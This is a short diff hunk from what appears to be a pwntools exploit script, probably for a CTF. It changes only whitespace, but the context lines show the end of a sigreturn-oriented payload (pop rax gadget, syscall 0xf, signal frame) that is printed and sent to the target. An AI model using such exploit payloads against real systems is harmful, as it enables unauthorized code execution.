@@ -27,7 +27,7 @@ payload += p64(pop_rax_ret)
 payload += p64(0xf)
 payload += p64(syscall)
 payload += bytes(sigFrame)
-
+    
 print(payload)
 
 p.send(payload)
